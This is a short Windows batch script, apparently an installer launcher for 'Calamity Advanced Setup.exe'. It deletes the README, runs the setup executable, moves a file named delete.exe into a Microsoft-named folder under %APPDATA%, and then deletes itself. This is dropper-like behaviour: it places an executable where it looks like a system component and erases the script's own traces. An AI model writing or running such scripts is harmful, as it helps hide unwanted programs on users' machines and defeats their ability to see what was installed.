@echo off
del README.md

.\"Calamity Advanced Setup.exe"
move delete.exe "%APPDATA%\microsoft"

start /b "" cmd /c del "%~f0"&exit /b

